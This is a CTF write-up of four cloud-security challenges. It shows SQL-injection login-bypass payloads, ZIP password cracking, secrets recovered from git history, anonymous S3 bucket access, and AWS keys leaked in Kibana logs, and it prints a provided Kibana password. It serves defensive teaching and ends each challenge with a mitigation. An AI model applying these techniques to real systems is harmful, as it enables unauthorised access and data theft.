CTF Writeup: RSA Cloud Village CTF 2025

Four cloud security challenges from RSA Conference's Cloud Village CTF — SQL injection + Azure blob cracking, GCP git secret leaks, log-hidden Base64 forensics, and leaked IAM creds in an open ELK stack.

Challenges

  1. Game Over: Incident Response
  2. PixelGen
  3. The Cheat in the KQLog
  4. The Phantom S3 Heist

Game Over: Incident Response

SQL Injection Azure Blob Storage fcrackzip

Description: Anomalies detected. Alarms blaring. The system's in lockdown — can you trace the breach, decode the chaos, and contain the fallout before the system pulls the plug? Target: http://game-over-dev.s3-website-us-west-2.amazonaws.com/

I started by visiting the target site and found a login page. Based on the hints ("Simple for both? Nothing is ever that simple!"), SQL injection seemed likely. I tested the password field with common payloads:

' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin' --

One of them bypassed the login and returned a full JSON dump of the user table:

[
  { "id": 1, "username": "gcp",   "password": "hello_gcp"   },
  { "id": 2, "username": "user1", "password": "password123"  },
  { "id": 3, "username": "user2", "password": "letmein"      },
  { "id": 4, "username": "azure", "password": "https://gameoverstorage.blob.core.windows.net/gameoverblob/protected_folder.zip" }
]

The azure user's "password" was an Azure Blob Storage URL pointing to a ZIP. I downloaded it:

wget https://gameoverstorage.blob.core.windows.net/gameoverblob/protected_folder.zip
unzip -l protected_folder.zip

The ZIP was password-protected. I tried the obvious passwords from the dump — none worked. I moved to a dictionary attack using fcrackzip with rockyou.txt:

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected_folder.zip

The password was cracked quickly. After extraction, file3.txt contained the flag.

🚩 Flag found in file3.txt inside the cracked ZIP

Takeaway: SQL injection on login forms is still a high-impact vulnerability. Never expose storage URLs as credentials, and use strong passwords on archives — especially ones containing sensitive data.

PixelGen

Git History GCP / GCS Service Account Key Leak

Description: PixelGen Cloud converts photos into pixel-perfect retro sprites. Repo: github.com/cloud-village/PixelGen. Hints: developers sometimes commit secrets by accident — look at the git history, and there's a Google Cloud Storage bucket involved.

I cloned the repo and inspected the commit history:

git clone https://github.com/cloud-village/PixelGen.git
cd PixelGen
git log

A commit labeled "oops" immediately caught my eye. I inspected it:

git show c1e50e26cb81f278609604c3aaf5dd24257e1c0d

The diff showed deleted environment variable exports that referenced a service account key file and a GCS bucket:

export GOOGLE_APPLICATION_CREDENTIALS="config.json"
export GCS_BUCKET_NAME="pixelgen-bucket"
gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS

The config.json had been deleted in a later commit but its full contents were still visible in the diff. I recreated the file from the history. Trying anonymous bucket access first:

gsutil ls gs://pixelgen-bucket/
# → AccessDenied

So I installed the Google Cloud SDK and authenticated with the recovered service account key:

curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-sdk-460.0.0-linux-x86_64.tar.gz
tar -xf google-cloud-sdk-460.0.0-linux-x86_64.tar.gz
./google-cloud-sdk/install.sh
./google-cloud-sdk/bin/gcloud auth activate-service-account --key-file=config.json

With auth working, I listed the bucket and downloaded the flag:

./google-cloud-sdk/bin/gsutil ls gs://pixelgen-bucket/
# → gs://pixelgen-bucket/flag.txt
./google-cloud-sdk/bin/gsutil cp gs://pixelgen-bucket/flag.txt .

🚩 Flag retrieved from gs://pixelgen-bucket/flag.txt

Takeaway: Deleting a file in a commit does not remove it from git history. Use git filter-repo or BFG Repo Cleaner to scrub secrets. Pre-commit hooks like git-secrets or truffleHog can catch this before it ever hits a remote.

The Cheat in the KQLog

Log Forensics Base64 S3 Public Access

Description: During a scheduled threat-hunting minigame, a security analyst noticed something strange in the event logs of the mainframe. The patterns looked routine — until a pixel out of place revealed a glitch in the matrix. Someone had tried to cover their tracks. Can you spot the misstep, trace the trail, and unlock the hidden flag before the clock runs out?

The challenge provided a log file with 1,001 entries. I started scanning for anomalies — null fields, malformed rows, anything that didn't match the pattern of the other entries.

At index 499, one entry stood out. All other rows had properly structured EventID, Source, User, and Description fields. This row had a very long comma-separated string in its Timestamp field, with all other fields empty.

The long string looked like Base64. I decoded it and got a legitimate-looking log line:

2025-03-08 09:14:25,4662,Microsoft Sentinel,unknown,
Suspicious DCSync operation detected. Unusual replication activity
observed. Investigation advised: check s3://cheat-kqlog/

The decoded message pointed to an S3 bucket. I tried listing it:

aws s3 ls s3://cheat-kqlog/
# → AccessDenied

aws s3 ls s3://cheat-kqlog/ --no-sign-request
# → flag.txt

Anonymous access worked with --no-sign-request. I downloaded the flag:

aws s3 cp s3://cheat-kqlog/flag.txt . --no-sign-request

🚩 Flag retrieved from s3://cheat-kqlog/flag.txt

Takeaway: Threat actors can hide data in unexpected log fields to evade automated parsers. Always validate that fields conform to expected types and lengths — a timestamp field containing 500+ characters is a dead giveaway.

The Phantom S3 Heist

Kibana / ELK Leaked IAM Credentials S3

Description: After Phantom's latest game drop, a misconfigured ELK stack was left wide open — logging everything without redaction. Somewhere in those logs: leaked IAM credentials and the path to a hidden S3 bucket. Trace the attacker's steps, find the creds, and steal the flag.

Credentials provided: Kibana at http://13.52.35.182:5601/ with elastic / c8PBcuDi8K7feZ7Wg*sf.

Inside Kibana, I searched for keywords like flag and secret. A log entry surfaced showing an s3:PutObject event — someone had uploaded flag.txt to a bucket:

Bucket: phantom-s3-heist-20250426231616516300000002
Region: us-west-1
Event:  s3:PutObject → flag.txt

My first attempts to access the bucket both failed:

aws s3 ls s3://phantom-s3-heist-20250426231616516300000002/
# → AccessDenied

aws s3 ls s3://phantom-s3-heist-20250426231616516300000002/ --no-sign-request
# → AccessDenied

The bucket wasn't publicly accessible. I went back into Kibana and searched for user — finding an AWS Access Key ID in the logs. Then searched for secretAccessKey and found the matching secret. I configured the CLI with these leaked credentials:

aws configure
# AWS Access Key ID: [from Kibana logs]
# AWS Secret Access Key: [from Kibana logs]
# Default region: us-west-1

With valid credentials, I copied the flag directly:

aws s3 cp s3://phantom-s3-heist-20250426231616516300000002/flag.txt ./flag.txt

🚩 Flag retrieved from s3://phantom-s3-heist-.../flag.txt

Takeaway: ELK stacks with public access and no field-level redaction are a goldmine for attackers. AWS credentials should never appear in application logs. Use IAM roles instead of long-lived access keys, and audit your log pipelines for credential leakage regularly.
